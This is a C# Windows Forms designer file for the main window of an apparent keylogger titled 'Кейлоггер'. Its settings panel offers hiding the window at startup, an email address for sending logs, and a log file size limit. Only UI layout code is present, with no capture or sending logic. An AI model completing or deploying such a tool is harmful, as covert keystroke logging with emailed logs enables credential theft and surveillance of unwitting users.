namespace GlobalHooks.View
{
    partial class MainWindow
    {
        /// <summary>
        /// Обязательная переменная конструктора.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Освободить все используемые ресурсы.
        /// </summary>
        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// <summary>
        /// Требуемый метод для поддержки конструктора — не изменяйте 
        /// содержимое этого метода с помощью редактора кода.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainWindow));
            this.btSettings = new System.Windows.Forms.Button();
            this.btHide = new System.Windows.Forms.Button();
            this.gbSettings = new System.Windows.Forms.GroupBox();
            this.numUDFileSize = new System.Windows.Forms.NumericUpDown();
            this.lbLogFileSize = new System.Windows.Forms.Label();
            this.tbEmail = new System.Windows.Forms.TextBox();
            this.lbEmail = new System.Windows.Forms.Label();
            this.cbHide = new System.Windows.Forms.CheckBox();
            this.lbHide = new System.Windows.Forms.Label();
            this.btAbort = new System.Windows.Forms.Button();
            this.btSave = new System.Windows.Forms.Button();
            this.gbSettings.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numUDFileSize)).BeginInit();
            this.SuspendLayout();
            // 
            // btSettings
            // 
            this.btSettings.BackColor = System.Drawing.Color.LavenderBlush;
            this.btSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btSettings.Location = new System.Drawing.Point(93, 136);
            this.btSettings.Name = "btSettings";
            this.btSettings.Size = new System.Drawing.Size(163, 63);
            this.btSettings.TabIndex = 0;
            this.btSettings.Text = "Настройки";
            this.btSettings.UseVisualStyleBackColor = false;
            this.btSettings.Click += new System.EventHandler(this.btSettings_Click);
            // 
            // btHide
            // 
            this.btHide.BackColor = System.Drawing.Color.LavenderBlush;
            this.btHide.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btHide.Location = new System.Drawing.Point(384, 136);
            this.btHide.Name = "btHide";
            this.btHide.Size = new System.Drawing.Size(163, 63);
            this.btHide.TabIndex = 1;
            this.btHide.Text = "Скрыть";
            this.btHide.UseVisualStyleBackColor = false;
            this.btHide.Click += new System.EventHandler(this.btHide_Click);
            // 
            // gbSettings
            // 
            this.gbSettings.Controls.Add(this.numUDFileSize);
            this.gbSettings.Controls.Add(this.lbLogFileSize);
            this.gbSettings.Controls.Add(this.tbEmail);
            this.gbSettings.Controls.Add(this.lbEmail);
            this.gbSettings.Controls.Add(this.cbHide);
            this.gbSettings.Controls.Add(this.lbHide);
            this.gbSettings.Controls.Add(this.btAbort);
            this.gbSettings.Controls.Add(this.btSave);
            this.gbSettings.Location = new System.Drawing.Point(13, 13);
            this.gbSettings.Name = "gbSettings";
            this.gbSettings.Size = new System.Drawing.Size(634, 311);
            this.gbSettings.TabIndex = 2;
            this.gbSettings.TabStop = false;
            this.gbSettings.Text = "Настройки";
            this.gbSettings.Visible = false;
            // 
            // numUDFileSize
            // 
            this.numUDFileSize.BackColor = System.Drawing.Color.LavenderBlush;
            this.numUDFileSize.Location = new System.Drawing.Point(382, 131);
            this.numUDFileSize.Maximum = new decimal(new int[] {
            10000,
            0,
            0,
            0});
            this.numUDFileSize.Minimum = new decimal(new int[] {
            500,
            0,
            0,
            0});
            this.numUDFileSize.Name = "numUDFileSize";
            this.numUDFileSize.Size = new System.Drawing.Size(111, 33);
            this.numUDFileSize.TabIndex = 7;
            this.numUDFileSize.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.numUDFileSize.Value = new decimal(new int[] {
            500,
            0,
            0,
            0});
            // 
            // lbLogFileSize
            // 
            this.lbLogFileSize.AutoSize = true;
            this.lbLogFileSize.Location = new System.Drawing.Point(25, 133);
            this.lbLogFileSize.Name = "lbLogFileSize";
            this.lbLogFileSize.Size = new System.Drawing.Size(262, 27);
            this.lbLogFileSize.TabIndex = 6;
            this.lbLogFileSize.Text = "Размер файла (байт):";
            // 
            // tbEmail
            // 
            this.tbEmail.BackColor = System.Drawing.Color.LavenderBlush;
            this.tbEmail.Location = new System.Drawing.Point(382, 92);
            this.tbEmail.Name = "tbEmail";
            this.tbEmail.Size = new System.Drawing.Size(231, 33);
            this.tbEmail.TabIndex = 5;
            // 
            // lbEmail
            // 
            this.lbEmail.AutoSize = true;
            this.lbEmail.Location = new System.Drawing.Point(25, 95);
            this.lbEmail.Name = "lbEmail";
            this.lbEmail.Size = new System.Drawing.Size(351, 27);
            this.lbEmail.TabIndex = 4;
            this.lbEmail.Text = "Email, куда отправлять логи:";
            // 
            // cbHide
            // 
            this.cbHide.AutoSize = true;
            this.cbHide.Location = new System.Drawing.Point(382, 61);
            this.cbHide.Name = "cbHide";
            this.cbHide.Size = new System.Drawing.Size(18, 17);
            this.cbHide.TabIndex = 3;
            this.cbHide.UseVisualStyleBackColor = true;
            // 
            // lbHide
            // 
            this.lbHide.AutoSize = true;
            this.lbHide.Location = new System.Drawing.Point(25, 55);
            this.lbHide.Name = "lbHide";
            this.lbHide.Size = new System.Drawing.Size(304, 27);
            this.lbHide.TabIndex = 2;
            this.lbHide.Text = "Скрыть окно при запуске";
            // 
            // btAbort
            // 
            this.btAbort.BackColor = System.Drawing.Color.LavenderBlush;
            this.btAbort.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btAbort.Location = new System.Drawing.Point(371, 255);
            this.btAbort.Name = "btAbort";
            this.btAbort.Size = new System.Drawing.Size(163, 39);
            this.btAbort.TabIndex = 1;
            this.btAbort.Text = "Отмена";
            this.btAbort.UseVisualStyleBackColor = false;
            this.btAbort.Click += new System.EventHandler(this.btAbort_Click);
            // 
            // btSave
            // 
            this.btSave.BackColor = System.Drawing.Color.LavenderBlush;
            this.btSave.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btSave.Location = new System.Drawing.Point(80, 255);
            this.btSave.Name = "btSave";
            this.btSave.Size = new System.Drawing.Size(163, 39);
            this.btSave.TabIndex = 0;
            this.btSave.Text = "Сохранить";
            this.btSave.UseVisualStyleBackColor = false;
            this.btSave.Click += new System.EventHandler(this.btSave_Click);
            // 
            // MainWindow
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(14F, 26F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Plum;
            this.ClientSize = new System.Drawing.Size(659, 336);
            this.Controls.Add(this.gbSettings);
            this.Controls.Add(this.btHide);
            this.Controls.Add(this.btSettings);
            this.Font = new System.Drawing.Font("PG Isadora Cyr Pro", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(5);
            this.Name = "MainWindow";
            this.Text = "Кейлоггер";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainWindow_FormClosing);
            this.Shown += new System.EventHandler(this.MainWindow_Shown);
            this.gbSettings.ResumeLayout(false);
            this.gbSettings.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numUDFileSize)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button btSettings;
        private System.Windows.Forms.Button btHide;
        private System.Windows.Forms.GroupBox gbSettings;
        private System.Windows.Forms.Label lbHide;
        private System.Windows.Forms.Button btAbort;
        private System.Windows.Forms.Button btSave;
        private System.Windows.Forms.NumericUpDown numUDFileSize;
        private System.Windows.Forms.Label lbLogFileSize;
        private System.Windows.Forms.TextBox tbEmail;
        private System.Windows.Forms.Label lbEmail;
        private System.Windows.Forms.CheckBox cbHide;
    }
}

